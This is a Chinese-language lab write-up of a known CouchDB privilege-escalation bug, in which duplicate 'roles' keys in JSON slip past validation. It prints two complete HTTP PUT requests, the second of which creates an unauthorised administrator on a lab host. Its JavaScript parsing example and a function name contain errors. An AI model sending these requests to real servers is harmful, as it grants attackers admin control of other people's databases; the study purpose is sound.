### 垂直权限绕过漏洞
#### 影响范围
Couchdb < 1.7.0 & < 2.1.1
#### 漏洞描述
由于Erlang和javaScript对于JSON解析方式的不同，导致语句执行产生差异性。由此可以让任意用户创建管理员，做到垂直越权。
#### 涉及知识
##### Apache CouchDB
Apache CouchDB是一个开源数据库，是一个使用JSON作为存储格式，CouchDB使用Erlang编写，但允许JavaScript作为查询语句，MaoReduce和HTTP作为API的NoSQL数据库。（因为之前接触到的数据库基本都是MYSQL，所以这次复现也主要是看看别的数据库）
##### Erlang
Erlang是一种通用的面向并发的编程语言。有着上手容易，容错率高，快速迭代等优点。不过这不是今天的重点。  
主要是需要看看Erlang对于JSON的解析：    
Erlang的JSON的库有

    https://github.com/sile/jsone
    https://github.com/talentdeficit/jsx
    https://github.com/davisp/jiffy
其中jiffy是NIF实现，其它两个是pure Erlang实现。  
用法：jiffy:decode("{"a":"1", "b":"2"}")    
结果：{[{<<"a">>,<<"1">>},{<<"b">>,<<"2">>}]}
##### javascript
JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名的，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。  
以上也都不是重点。Javascript对JSON的解析：  
用法：var obj = JSON.parse({"success":"成功","false":"失败"});   
结果：{{success: "成功"},{false："失败"}}
##### 不同
上面的对于Erlang和对于javascript的简介都都都不是重点。。。
可以看到其实两者对于JSON的解析其实是大同小异的，除开调用的方法：一个是decode一个是parse不同外，似乎结果是一样的。但是当JSON中的键如果都相同时，差别就显现出来了。      
Erlang：   
-   用法：jiffy:decode("{"a":"1", "a":"2"}")  
-   结果：{[{<<"a">>,<<"1">>},{<<"a">>,<<"2">>}]}   

javascript：   
-   用法：JSON.parse("{"a":"1", "a":"2"}")  
-   结果：{a: "2"}      

可以看到同样的键，Erlang会存储两个值，而javascript只会存储第二个值。

#### 漏洞复现
首先查看当未绕过检测时，尝试创建一个管理员用户时的结果：    
发送PUT数据包： 
```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: 192.168.86.141:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 90

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
}
```
结果自然是不理想的，返回403错误。      
![avatar](/pictures/admin_0.png)    
接下来进行绕过检测试试：    
```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: 192.168.86.141:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "roles": [],
  "password": "vulhub"
}
```
返回了OK，true那么应该是创建成功了，登录试一试，可以成功登录为管理员。      
![avatar](/pictures/admin_1.png) 

#### 漏洞分析
这个其实是一个很简单的逻辑问题。    
在CouchDB中会有用以检测javascript语句的函数检查即vaildata_doc_update函数。那么很明显当javascript存在两个键值时，他只会检测第二个键值。  
而CouchDB内部数据表示有一个getter函数，当存在多个键值时，他只会返回第一个值。  
```
lists:keysearch(Key, 1, List).
```
以上正好就给我们提供了思路：我们需要构造管理员的角色，当自己一开始去构造admin角色时，他会进行检测，并告诉你，只有管理员能设置角色，是用户还是管理员。那么我们需要绕过这个检测，这个检测就是刚刚说的vaildata_doc_update，这个函数是检测javascript的函数，即他只会对第二个值进行检测，那么第二个值，我们不进行操作即可。正好他在多个值时只返回第一个值，那么直接对第一个值进行设置即可。
#### 思考
1. 首先就是对两种语言对JSON的解析，这个真的就是知道就是知道，不知道就是不知道，所以平时要注意积累。
2. 当看到允许多个解析器来处理相同的数据时，可以注意看看几个解析之间的不同，然后就是注意看对数据的检测和数据的返回，数据利用时是否有可以利用的地方。

#### 参考文献
https://justi.cz/security/2017/11/14/couchdb-rce-npm.html   
https://www.anquanke.com/post/id/87256
